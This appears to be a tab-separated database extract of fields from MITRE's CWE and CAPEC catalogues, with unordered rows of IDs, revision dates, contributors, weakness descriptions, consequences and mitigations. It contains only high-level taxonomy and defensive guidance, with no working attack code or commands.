8012	39	2019-01-03
11920	94	Denial of Service
8276	47	Read Data
13542	51	2014-06-23
14961	81	Confidentiality
5836	39	2011-09-13
24945	62	updated Relationships
23803	59	Updated Related_Weaknesses
11242	62	updated Related_Attack_Patterns, Relationships
15341	33	Apurva Udaykumar
17889	90	Java
12118	63	Gain Privileges or Assume Identity
9672	81	Integrity
16797	43	Simple
6963	76	2019-04-04
17866	39	2014-07-30
18986	100	The MITRE Corporation
17395	26	Implementation
22002	39	2008-09-08
23006	62	updated Description, Relationships, Observed_Example, Other_Notes, Taxonomy_Mappings
8828	51	2015-11-09
13934	31	1000
19501	26	Implementation
10220	35	MITRE
18163	62	updated Common_Consequences
19995	62	updated Demonstrative_Examples
23680	35	MITRE
20443	73	Inspect the SOAP message routing head to see whether the XML processing has multiple stages or not.
21982	40	The checksum value must be computable using information known to the adversary. A cryptographic checksum, which uses a key known only to the sender and recipient, would thwart this attack.
24803	28	CWE Content Team
12656	28	CWE Content Team
8308	43	Simple
24818	21	Anonymous Tool Vendor (under NDA)
19994	39	2009-07-27
14951	28	CWE Content Team
21172	23	An attacker alters or establishes rogue processes in an integration facility in order to insert maliciously altered components into the system. The attacker would then supply the malicious components. This would allow for malicious disruption or additional compromise when the system is deployed.
23824	62	updated Potential_Mitigations
15507	39	2008-08-01
24216	35	MITRE
11529	35	MITRE
6114	35	MITRE
24834	23	The software reads data past the end, or before the beginning, of the intended buffer.
20577	44	High
24580	28	CWE Content Team
24170	42	Use a CPU and operating system that offers Data Execution Protection (NX) or its equivalent [REF-61] [REF-60].
23494	69	Draft
23108	63	Modify Application Data
20372	62	updated References
17327	35	MITRE
8841	55	CAPEC Content Team
19514	39	2009-05-27
24917	30	Andrew Bortz
24510	103	Primary
9635	56	CanPrecede
23842	102	CanFollow
14676	28	CWE Content Team
14670	56	ChildOf
6267	39	2012-05-11
13963	91	Implementation
22952	62	updated Description, Related_Attack_Patterns
8676	66	Application DLL Load Hijacking
11155	62	updated Modes_of_Introduction, Relationships
24495	35	MITRE
24735	57	Primary
17879	90	Language-Independent
12710	62	updated Common_Consequences, Demonstrative_Examples, Relationships
16603	31	1000
16075	43	Simple
24079	61	Stable
10693	91	Implementation
25292	35	MITRE
9604	79	Access Control
19780	30	Shlomo, Yona
12019	88	Improper Handling of Parameters
17633	35	MITRE
11381	91	Implementation
20946	103	Primary
13170	42	Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.                   OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.                   This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.                   Be careful to avoid CWE-243 and other weaknesses related to jails.
21141	63	Modify Files or Directories
19771	39	2010-04-05
21666	23	The software does not neutralize or incorrectly neutralizes delimiters.
13251	39	2009-07-27
25387	50	Implementation: Disable scripting languages such as JavaScript in browser
7952	39	2012-05-11
19016	36	http://www.wisec.it/en/Docs/flash_App_testing_Owasp07.pdf
8118	45	Base
9445	28	CWE Content Team
5698	39	2011-06-01
20257	35	MITRE
7301	28	Sean Eidemiller
16876	62	updated Relationships
15834	43	Simple
5766	91	Implementation
15027	40	Knowledge of the target system's vulnerabilities that can be capitalized on with malicious code.The adversary must be able to place the malicious code on the target system.
22796	62	updated Relationships
20615	31	699
14777	31	1000
15248	69	Draft
13654	62	updated Common_Consequences, Demonstrative_Examples, References, Relationships
11301	28	CWE Content Team
22272	96	2009-05-13
15853	35	MITRE
6984	23	An attacker exploits a weakness in input validation by controlling the format, structure, and composition of data to an input-processing interface. By supplying input of a non-standard or unexpected form an attacker can adversely impact the security of the target. For example, using a different character encoding might cause dangerous text to be treated as safe text. Alternatively, the attacker may use certain flags, such as file extensions, to make a target application believe that provided data should be handled using a certain interpreter when the data is not actually of the appropriate type. This can lead to bypassing protection mechanisms, forcing the target to use specific components for input processing, or otherwise causing the user's data to be handled differently than might otherwise be expected. This attack differs from Variable Manipulation in that Variable Manipulation attempts to subvert the target's processing through the value of the input while Input Data Manipulation seeks to control how the input is processed.
15515	91	Architecture and Design
13296	56	ChildOf
22795	63	Bypass Protection Mechanism
18734	35	MITRE
16986	28	CWE Content Team
13970	21	Anonymous Tool Vendor (under NDA)
17030	28	CWE Content Team
6885	33	Solar Designer
21928	28	CWE Content Team
9591	93	Defense in Depth
19612	31	1000
10211	25	Medium
10292	91	Operation
23800	35	MITRE
11814	62	updated Common_Consequences
12858	39	2017-11-08
13018	56	ChildOf
9814	88	ASP.NET Misconfiguration: Missing Custom Error Page
21335	35	MITRE
8190	35	MITRE
6433	28	CWE Content Team
6251	62	updated Description, Name
7887	39	2011-09-13
21530	31	1000
16034	28	CWE Content Team
19395	69	Draft
6322	69	Incomplete
7863	35	MITRE
23631	92	Exploit
21488	75	Detection techniques for buffer-related errors are more mature than for most other weakness types.
6171	76	2019-04-04
21196	33	NIST
12655	28	CWE Content Team
11331	21	CWE Content Team
6709	100	The MITRE Corporation
12730	103	Primary
11378	79	Access Control
20919	61	Stable
18971	35	MITRE
12169	59	Updated Attack_Phases
6892	56	ChildOf
22532	100	The MITRE Corporation
10867	58	Phishing is a general term for deceptive attempts to coerce private information from users that will be used for identity theft.
15284	28	CWE Content Team
6950	43	Simple
10851	62	updated Relationships
14301	39	2012-10-30
24723	81	Confidentiality
14866	100	The MITRE Corporation
13063	43	Simple
24793	28	CWE Content Team
14189	100	The MITRE Corporation
19745	72	Race conditions such as this kind may be employed to gain read or write access to resources not normally readable or writable by the user in question.
12971	80	In cases of directed overflows, where the motive is to divert the flow of the program or application as per the adversaries' bidding, high level skills are required. This may involve detailed knowledge of the target system architecture and kernel.
18188	47	Gain Privileges
23100	28	CWE Content Team
19280	69	Incomplete
22582	79	Integrity
20538	56	CanPrecede
14748	56	ChildOf
10498	62	updated Potential_Mitigations, Time_of_Introduction
25432	103	Primary
20138	28	CWE Content Team
19096	31	1000
11885	39	2011-06-01
6667	21	CWE Content Team
23612	63	Varies by Context
6950	23	The program calls a function that can never be guaranteed to work safely.
7513	57	Primary
17262	25	High
10558	35	MITRE
18292	48	05
9002	62	updated Relationships
15884	35	MITRE
6666	28	CWE Content Team
17702	104	696
7934	39	2012-05-11
9261	62	updated Relationships
24966	39	2011-06-27
22921	51	2014-06-23
7626	39	2009-05-27
16213	62	updated References, Relationships
17879	69	Draft
11525	42	Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations ("stretching") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.                   Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.                   Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.
14477	35	MITRE
24774	26	Architecture and Design
13717	53	The MITRE Corporation
19584	76	2017-05-01
23622	23	Validation fields that do not appear in forms they are associated with indicate that the validation logic is out of date.
22068	95	[Access the function or data bypassing the access control] The attacker executes the function or accesses the data identified in the Explore phase bypassing the access control.
9850	95	[Craft exploit payloads] Put specially crafted input into the system that leverages the weakness identified through fuzzing and allows to achieve the goals of the attacker. Fuzzers often reveal ways to slip through the input validation filters and introduce unwanted data into the system.
7669	42	Ensure that the software runs properly under the Federal Desktop Core Configuration (FDCC) [REF-199] or an equivalent hardening configuration guide, which many organizations use to limit the attack surface and potential risk of deployed software.
8496	103	Primary
14032	21	CLASP
19437	56	ChildOf
9675	91	Requirements
7331	39	2010-02-16
24396	53	The MITRE Corporation
11447	23	The application attempts to return a memory resource to the system, but calls the wrong release function or calls the appropriate release function incorrectly.
24435	78	High
19047	23	The software contains a protection mechanism that restricts access to a long filename on a Windows operating system, but the software does not properly restrict access to the equivalent short "8.3" filename.
17022	39	2017-11-08
13877	62	updated Applicable_Platforms
22963	100	The MITRE Corporation
19278	35	MITRE
6471	85	14
6154	62	updated Relationships
5971	39	2015-12-07
8655	90	C++
12872	81	Confidentiality
10840	62	updated Demonstrative_Examples, Detection_Factors, Relationships, Taxonomy_Mappings
9727	35	MITRE
20222	57	Indirect
21540	61	Stable
23892	28	CWE Content Team
7689	25	Low
20246	62	updated Relationships, Taxonomy_Mappings
22187	69	Incomplete
13314	39	2008-07-01
17270	28	CWE Content Team
18001	40	The adversary requires the ability to send a UDP datagram to a remote host and receive a response.
23011	62	updated Detection_Factors, Relationships, Taxonomy_Mappings
9223	56	CanPrecede
17944	56	ChildOf
12719	101	CAPEC Content Team
21814	62	updated Applicable_Platforms
17592	21	CWE Content Team
17112	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
6447	94	The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.
18087	39	2010-02-16
17808	62	updated Common_Consequences
10609	28	CWE Content Team
10945	81	Confidentiality
6937	35	MITRE
16797	57	Primary
11773	39	2011-03-29
15653	50	Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.
20865	59	Updated Related_Weaknesses
10573	35	MITRE
23455	104	198
23073	62	updated Potential_Mitigations
12927	39	2009-05-27
5838	43	Simple
9179	23	The application stores sensitive information in cleartext in a file, or on disk.
24169	39	2009-03-10
16760	91	Implementation
21786	39	2008-08-15
21650	91	System Configuration
16898	53	The MITRE Corporation
10896	28	CWE Content Team
19436	28	CWE Content Team
7360	39	2008-08-15
7684	39	2013-02-21
11214	88	Improper Resource Locking
24256	50	Protect the configuration files which contain environment variables against illegitimate read and write access.
13502	102	ChildOf
17183	40	No new lines can be present in the injected CSS stringProper HTML or URL escaping of the " and ' characters is not presentThe attacker has control of two injection points: pre-string and post-string
7318	62	updated Related_Attack_Patterns, Relationships
5908	91	Architecture and Design
7816	35	MITRE
21720	62	updated Demonstrative_Examples
21172	40	Physical access to an integration facility that prepares the system before it is deployed at the victim location.
10900	28	CWE Content Team
21964	48	08
13144	74	1
7498	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
16555	28	CWE Content Team
12342	35	MITRE
18262	35	MITRE
9558	62	updated Relationships, Taxonomy_Mappings
11718	45	Base
13008	35	MITRE
21545	34	When the software uses certificate pinning, the developer might not properly validate all relevant components of the certificate before pinning the certificate. This can make it difficult or expensive to test after the pinning is complete.
9145	35	Cigital
6139	81	Integrity
7171	63	Other
20161	101	CAPEC Content Team
6534	28	CWE Content Team
24937	39	2012-05-11
8104	35	MITRE
6189	104	757
9811	62	updated Demonstrative_Examples
24721	96	2018-12-21
9858	39	2014-07-30
10969	63	Bypass Protection Mechanism
16169	62	updated Common_Consequences
9924	101	CAPEC Content Team
21986	102	ChildOf
23143	62	updated Relationships
5678	31	1000
12380	70	Alternate Data Streams: Out of the Shadows and into the Light
9301	103	Primary
15735	28	CWE Content Team
17605	69	Draft
11797	50	Have a large pool of backup IPs built into the application and support proxy capability in the application.
22166	66	Role Based Access Control and Role Based Security
16199	62	updated Relationships
13857	91	Architecture and Design
12773	39	2014-07-30
9462	62	updated Relationships, Taxonomy_Mappings
10825	62	updated Relationships
17386	35	MITRE
13978	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description, Description Summary, Solutions_and_Mitigations
6123	90	Interpreted
17043	35	Cigital
17668	31	1000
7445	69	Incomplete
12879	59	Updated Attack_Prerequisites
23621	39	2011-03-29
20406	55	CAPEC Content Team
14007	31	1000
24001	28	CWE Content Team
24131	28	Tom Stracener
21783	23	A PHP application does not properly protect against the modification of variables from external sources, such as query parameters or cookies. This can expose the application to numerous weaknesses that would not exist otherwise.
12553	102	ChildOf
13199	35	MITRE
13086	55	CAPEC Content Team
21234	26	Architecture and Design
19896	33	Georgi Guninski
18757	79	Confidentiality
13335	62	updated Potential_Mitigations, Time_of_Introduction
10065	35	MITRE
8425	35	MITRE
11659	42	Use automated tools to check for privilege settings.
21802	39	2012-05-11
14484	28	CWE Content Team
11616	91	Architecture and Design
18646	62	updated Relationships, Other_Notes, Taxonomy_Mappings
11470	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
12122	100	The MITRE Corporation
18272	39	2010-09-27
10488	43	Simple
8776	45	Base
18597	42	When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.
12423	39	2008-09-08
13877	28	CWE Content Team
16577	56	ChildOf
14358	46	The resultant vulnerabilities depend on the behavior of the application, both at the crossover point and in any control/data flow that is reachable by the related variables or functions.
13372	39	2012-05-11
22382	66	19 Deadly Sins of Software Security
20025	62	updated Relationships, Taxonomy_Mappings
13390	35	MITRE
24971	35	MITRE
17902	104	695
16284	51	2014-06-23
8599	42	Use multiple simultaneous checks before granting access to critical operations or granting critical privileges. A weaker but helpful mitigation is to use several successive checks (multiple layers of security).
21039	68	This makes it easier to spot places in the code where data is being used that is unencrypted.
16081	28	Eric Dalci
10365	39	2009-07-27
9347	35	MITRE
18049	35	MITRE
23989	95	[Survey] The attacker surveys the target application, possibly as a valid and authenticated user
23078	23	The software uses an algorithm or scheme that produces insufficient entropy, leaving patterns or clusters of values that are more likely to occur than others.
25399	35	MITRE
9940	78	Very High
8632	39	2012-10-30
7991	89	Meta
22788	62	updated Potential_Mitigations
15900	102	ChildOf
11140	39	2019-09-19
24296	62	updated Potential_Mitigations
19045	79	Confidentiality
7275	26	Architecture and Design
12529	28	CWE Content Team
9439	39	2019-01-03
17169	62	updated Common_Consequences, Demonstrative_Examples, References, Relationships
17995	76	2018-07-31
11849	26	Architecture and Design
22218	39	2011-06-01
9575	62	updated Relationships
10739	100	The MITRE Corporation
19994	62	updated Demonstrative_Examples, Other_Notes, Potential_Mitigations
17105	28	CWE Content Team
22961	35	MITRE
23177	92	Exploit
9384	28	CWE Content Team
11955	21	Anonymous Tool Vendor (under NDA)
11619	59	Updated References
14365	40	An adverssary must possess the ability to generate a large amount of XML based messages to send to the target service.
19723	104	707
11443	73	Determine the permissions for the TTYs found on the system. Any that allow user write to the TTY may be vulnerable.
11425	39	2017-11-08
15059	62	updated Relationships
8179	35	MITRE
19829	35	MITRE
15304	39	2012-05-11
19377	55	CAPEC Content Team
8782	85	161
22967	63	Other
7776	59	Updated Related_Attack_Patterns
20979	28	CWE Content Team
18627	55	CAPEC Content Team
23614	39	2010-04-05
24784	59	Updated Related_Attack_Patterns
17774	28	CWE Content Team
14038	28	CWE Content Team
14480	62	updated Time_of_Introduction
6871	95	While consuming the data, the target host does not check for buffer boundary which can lead to a buffer overflow. If the content of the data is controlled by the attacker, this is an avenue for remote code execution.
10414	28	CWE Content Team
16180	35	MITRE
14109	42	When prompting for a password change, force the user to provide the original password in addition to the new password.
12493	31	1000
13288	31	699
13274	76	2018-07-31
14890	81	Access Control
19213	56	ChildOf
25191	39	2017-11-08
15591	39	2014-07-30
19282	103	Primary
9020	35	MITRE
14607	62	updated Other_Notes, Relationship_Notes
21543	39	2012-10-30
19438	62	updated Relationships, Other_Notes, Taxonomy_Mappings
8425	39	2014-07-30
22196	60	28
18556	51	2014-06-23
18540	35	MITRE
25254	44	High
25207	62	updated Description, Potential_Mitigations, References, Relationships, Type
7931	28	CWE Content Team
13808	81	Other
20113	62	updated Common_Consequences
22733	28	CWE Content Team
21838	35	MITRE
11774	79	Confidentiality
15400	62	updated Taxonomy_Mappings
8325	101	CAPEC Content Team
10278	102	ChildOf
12630	63	Bypass Protection Mechanism
12935	46	If the revocation status of a certificate is not checked before each action that requires privileges, the system may be subject to a race condition. If a certificate is revoked after the initial check, all subsequent actions taken with the owner of the revoked certificate will lose all benefits guaranteed by the certificate. In fact, it is almost certain that the use of a revoked certificate indicates malicious activity.
13207	23	The software receives input from an upstream component, but it does not handle or incorrectly handles when an additional unexpected special element is missing.
25155	72	The uninitialized data may be invalid, causing logic errors within the program. In some cases, this could result in a security problem.
19839	26	Architecture and Design
17233	62	updated Time_of_Introduction
22454	81	Access Control
12120	23	Buffer Overflow attacks target improper or missing bounds checking on buffer operations, typically triggered by input injected by an adversary. As a consequence, an adversary is able to write past the boundaries of allocated buffer regions in memory, causing a program crash or potentially redirection of execution as per the adversaries' choice.
9345	39	2017-01-19
13080	28	CWE Content Team
23526	35	MITRE
22760	39	2011-06-27
16795	57	Primary
9514	35	MITRE
23469	76	2018-07-31
9678	61	Draft
5876	56	ChildOf
7546	47	Unreliable Execution
11917	39	2019-09-19
13825	28	CWE Content Team
12634	59	Updated Attack_Prerequisites, Description Summary, Typical_Likelihood_of_Exploit
20082	62	updated References, Relationships
22803	92	Exploit
14622	31	699
6322	43	Simple
19061	62	updated Related_Attack_Patterns
21341	28	CWE Content Team
21049	85	457
12080	28	Sean Eidemiller
8898	62	updated Other_Notes, Related_Attack_Patterns
7863	28	CWE Content Team
24115	35	MITRE
20511	90	C#
19952	45	Base
13527	35	MITRE
11662	88	Improper Handling of Inconsistent Special Elements
11839	62	updated Time_of_Introduction
7930	39	2019-01-03
6993	79	Authorization
15312	55	CAPEC Content Team
24501	35	MITRE
14552	91	Operation
21048	62	updated Potential_Mitigations
21278	79	Access Control
18386	35	MITRE
15454	42	Software tools are capable of finding ADSs on your system.
21969	63	Reduce Performance
10834	62	updated Potential_Mitigations
8958	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
22880	56	ChildOf
8855	63	DoS: Resource Consumption (Memory)
13982	59	Updated Related_Attack_Patterns
6308	39	2010-06-21
21614	39	2014-07-30
13137	56	ChildOf
8134	62	updated Relationships
8537	39	2011-06-01
9828	21	PLOVER
14375	63	Other
22318	39	2009-05-27
22907	35	MITRE
6281	61	Draft
15016	62	updated Applicable_Platforms, Modes_of_Introduction, References, Relationships
13962	99	SANS Software Security Institute
21144	76	2019-04-04
5834	35	Cigital
15993	21	CLASP
19255	92	Experiment
14951	39	2010-04-05
18084	70	WASC Threat Classification 2.0
8502	62	updated Applicable_Platforms
18981	62	updated References, Relationships
10259	39	2008-07-01
22122	100	The MITRE Corporation
9327	96	2018-07-02
6311	56	ChildOf
16684	73	Comparison against time. The attacker plots or compares the issued IDs to the time they were issued to check for correlation.
24321	42	Developers should anticipate that whitespace will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
16785	28	CWE Content Team
8001	31	1000
7250	81	Non-Repudiation
8884	48	09
22352	56	ChildOf
10457	28	CWE Content Team
16298	62	updated Potential_Mitigations
18482	28	CWE Content Team
20618	40	A variable consumed by the application server can be overwritten by the user.
11576	77	Automated Static Analysis - Source Code
23570	39	2019-01-03
21501	90	Language-Independent
14084	28	CWE Content Team
7078	25	High
12100	79	Authorization
20664	77	Manual Static Analysis - Source Code
21667	77	Automated Static Analysis
8917	103	Primary
8443	73	Try other known exploits to elevate privileges sufficient to bypass protected directories.
23097	23	An adversary deploys a keylogger in an effort to obtain credentials directly from a system's user. After capturing all the keystrokes made by a user, the adversary can analyze the data and determine which string are likely to be passwords or other credential related information.
14591	46	Some programs use signed integers or floats even when their values are only expected to be positive or 0. An input validation check might assume that the value is positive, and only check for the maximum value. If the value is negative, but the code assumes that the value is positive, this can produce an error. The error may have security consequences if the negative value is used for memory allocation, array access, buffer access, etc. Ultimately, the error could lead to a buffer overflow or other type of memory corruption.             The use of a negative number in a positive-only context could have security implications for other types of resources. For example, a shopping cart might check that the user is not requesting more than 10 items, but a request for -3 items could cause the application to calculate a negative price and credit the attacker's account.
23423	76	2017-08-04
23154	61	Stable
21482	39	2014-07-30
5925	62	updated Relationships, Taxonomy_Mappings
19122	55	CAPEC Content Team
24729	44	SOAR Partial
24733	39	2010-12-13
10167	101	CAPEC Content Team
17593	62	updated Common_Consequences
14565	35	MITRE
21303	76	2017-05-01
16651	23	This attack utilizes XQuery to probe and attack server systems; in a similar manner that SQL Injection allows an attacker to exploit SQL calls to RDBMS, XQuery Injection uses improperly validated data that is passed to XQuery commands to traverse and execute commands that the XQuery routines have access to. XQuery injection can be used to enumerate elements on the victim's environment, inject commands to the local host, or execute queries to remote files and data sources.
24357	70	SOAP Array Attack
8390	101	CAPEC Content Team
9974	95	[Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process XML requests.
11460	62	updated Relationships
19199	62	updated Time_of_Introduction
23314	35	MITRE
6454	100	The MITRE Corporation
7002	28	Eric Dalci
13748	91	Implementation
12491	59	Updated Related_Weaknesses
22984	91	Architecture and Design
12166	62	updated Relationships, Type
7712	35	MITRE
15835	62	updated Demonstrative_Examples
14322	88	Exposure of Resource to Wrong Sphere
23393	50	Implementation: Disable scripting languages such as JavaScript in browser
8360	59	Updated Related_Attack_Patterns
14817	35	MITRE
12820	42	Debugging information should not make its way into a production release.
10044	39	2011-03-29
22881	39	2017-01-19
6073	39	2017-11-08
19953	35	MITRE
21758	63	Reduce Maintainability
5834	39	2008-07-01
12612	23	Attacks that reveal the password/passcode pattern on a touchscreen device by detecting oil smudges left behind by the user’s fingers.
13399	101	CAPEC Content Team
12995	31	699
22288	28	CWE Content Team
16335	55	CAPEC Content Team
12744	51	2014-06-23
7383	35	Cigital
9945	28	CWE Content Team
11372	63	Other
12064	28	CWE Content Team
19521	39	2010-02-16
22405	81	Integrity
18062	31	1003
17701	62	updated Relationships
15144	100	The MITRE Corporation
18892	28	CWE Content Team
9446	62	updated Relationships
19610	85	422
13285	21	CWE Content Team
16069	39	2014-07-30
20867	81	Integrity
22541	45	Variant
10786	35	MITRE
17889	23	The product does not properly synchronize shared data, such as static variables across threads, which can lead to undefined behavior and unpredictable data changes.
23803	76	2019-04-04
20544	76	2019-09-30
7437	63	Bypass Protection Mechanism
23863	28	CWE Content Team
24652	62	updated Potential_Mitigations
16831	24	MITRE
20997	90	Perl
12722	62	updated Description
13017	39	2011-06-01
15165	81	Confidentiality
9286	81	Confidentiality
24385	79	Availability
6156	39	2019-01-03
18344	35	Cigital
12067	28	CWE Content Team
8058	66	Programming Language Format String Vulnerabilities
20864	102	ChildOf
8890	72	Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code.
14533	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings, White_Box_Definitions
22383	35	MITRE
8350	85	165
5709	88	Path Equivalence: 'filedir*' (Wildcard)
7577	39	2010-12-13
24959	23	The program compares object references instead of the contents of the objects themselves, preventing it from detecting equivalent objects.
6042	31	1000
11866	103	Primary
22440	35	MITRE
16225	69	Incomplete
7545	62	updated Potential_Mitigations
9075	67	High
8956	79	Integrity
24363	39	2011-06-01
24083	42	Pre-design: Use a language or compiler that performs automatic bounds checking.
17248	28	CWE Content Team
24124	45	Variant
9780	43	Simple
7737	39	2018-03-27
5926	60	01
21923	28	CWE Content Team
17796	62	updated Observed_Examples, Relationships
6391	32	The Open Web Application Security Project (OWASP)
18291	23	An adversary exploits functionality meant to identify information about the services on the target system to an authorized user. By knowing what services are registered on the target system, the adversary can learn about the target environment as a means towards further malicious behavior. Depending on the operating system, commands that can obtain services information include "sc" and "tasklist/svc" using Tasklist, and "net start" using Net.
8290	28	CWE Content Team
24088	42	Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.
11023	39	2009-03-10
19817	39	2011-06-27
7437	63	Read Application Data
13263	62	updated Related_Attack_Patterns
22946	103	Primary
5772	35	MITRE
12996	31	1000
8959	43	Simple
19744	59	Updated @Abstraction
13712	44	High
24473	28	CWE Content Team
10976	25	Low
13403	42	Carefully check each input parameter against a rigorous positive specification (whitelist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.
23866	85	479
8969	76	2017-08-04
6286	26	Implementation
11777	43	Simple
19159	28	CWE Content Team
21540	50	Ensure that all user-supplied input is validated before use.
18394	28	CWE Content Team
22031	47	Execute Unauthorized Commands
8127	28	Eric Dalci
18588	46	The function or method that has been called can alter or delete the mutable data. This could violate assumptions that the calling function has made about its state. In situations where unknown code is called with references to mutable data, this external code could make changes to the data sent. If this data was not previously cloned, the modified data might not be valid in the context of execution.
7009	56	ChildOf
7289	21	CWE Content Team
20829	72	The uninitialized resource may contain values that cause program flow to change in ways that the programmer did not intend.
12722	28	CWE Content Team
15248	90	Java
9228	90	Language-Independent
23821	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
10669	55	CAPEC Content Team
14771	35	MITRE
18096	57	Indirect
21555	28	CWE Content Team
22976	62	updated Common_Consequences, Description
7848	26	Architecture and Design
9395	101	CAPEC Content Team
25304	56	ChildOf
14308	39	2019-01-03
14766	30	Markus Kuhn
10948	40	The adversary must have the means and knowledge of how to communicate with the target in some manner.
18987	104	487
13365	35	MITRE
15450	46	This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.             Sometimes a program checks for "../" at the beginning of the input, so a "/../" can bypass that check.
5926	48	08
17990	39	2010-02-16
6408	28	CWE Content Team
23096	62	updated Observed_Examples
10978	39	2019-01-03
7055	81	Integrity
5738	100	The MITRE Corporation
8659	77	Automated Static Analysis
10090	103	Primary
11447	88	Release of Invalid Pointer or Reference
16574	80	Some more advanced attacks may require knowledge about protocols and probing technique which help controlling a variable. The malicious user may try to understand the authentication mechanism in order to defeat it.
11924	39	2008-09-08
10449	53	The MITRE Corporation
7564	63	DoS: Crash, Exit, or Restart
23123	76	2017-01-09
5834	28	Eric Dalci
14836	62	updated Modes_of_Introduction, Other_Notes
11886	27	The adversary may need the capability to host code modules if they wish their own code files to be included.
7680	63	Unexpected State
21963	72	If one trusts the system-event information and executes commands based on it, one could potentially take actions based on a spoofed identity.
13505	39	2017-05-03
16833	74	4
24483	79	Confidentiality
14557	97	TCP (ISN) Greatest Common Divisor Probe
11172	50	Implementation: Disable scripting languages such as JavaScript in browser
9894	102	CanPrecede
6021	39	2008-07-01
19091	62	updated Potential_Mitigations
21349	56	ChildOf
24618	39	2012-05-11
23184	104	455
16718	35	MITRE
10952	28	CWE Content Team
12476	39	2008-11-24
12970	62	updated Description, Other_Notes
22336	39	2014-07-30
14405	102	ChildOf
9877	52	Automated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.                   Generally, automated static analysis tools have difficulty detecting custom authorization schemes. Even if they can be customized to recognize these schemes, they might not be able to tell whether the scheme correctly performs the authorization in a way that cannot be bypassed or subverted by an attacker.
20986	35	MITRE
10888	35	MITRE
10027	79	Confidentiality
10508	43	Simple
6405	89	Standard
9249	79	Availability
14017	39	2009-10-29
13997	31	699
20175	39	2012-10-30
13678	62	updated Name
12848	79	Confidentiality
22528	51	2014-06-23
8415	28	Eric Dalci
17066	35	MITRE
22837	28	CWE Content Team
22898	35	MITRE
21811	44	SOAR Partial
17650	35	MITRE
16470	76	2019-04-04
21599	100	The MITRE Corporation
20459	89	Detailed
20035	101	CAPEC Content Team
11365	62	updated Common_Consequences, Demonstrative_Examples, Relationships
5987	28	CWE Content Team
12759	39	2009-05-27
11880	46	This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.    While the interpetation of "excessive volume" may vary for each product or developer, CISQ recommends a default threshold of 2% of commented code.
19518	62	updated References, Relationships
16625	59	Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit
5798	62	updated Demonstrative_Examples
11371	66	RFC2898 - PKCS #5: Password-Based Cryptography Specification Version 2.0
17103	103	Primary
15776	97	ICMP IP Total Length Field Probe
16910	62	updated References
20979	39	2009-05-27
15209	79	Integrity
9158	28	CWE Content Team
10169	28	CWE Content Team
11212	69	Draft
14504	62	updated Relationships
25288	104	375
17535	47	Other
22453	104	671
6929	90	Language-Independent
21010	62	updated Potential_Mitigations
12647	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis
19165	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit
16641	39	2017-11-08
13648	103	Primary
13290	69	Incomplete
17503	35	MITRE
12400	79	Confidentiality
13907	30	Juliano Rizzo
23174	31	700
7657	102	CanPrecede
11499	85	68
25270	28	CWE Content Team
10936	35	MITRE
14397	56	ChildOf
12761	62	updated Applicable_Platforms
7319	94	Run Arbitrary Code
20342	103	Primary
14223	28	CWE Content Team
14332	90	C
18059	79	Access Control
10021	28	CWE Content Team
13702	62	updated Time_of_Introduction
20358	91	Architecture and Design
17474	35	MITRE
13303	79	Confidentiality
10143	62	updated Common_Consequences, Relationships
21657	90	C++
13565	104	1125
9757	35	MITRE
21870	35	MITRE
22328	85	90
22899	31	1000
16581	91	Testing
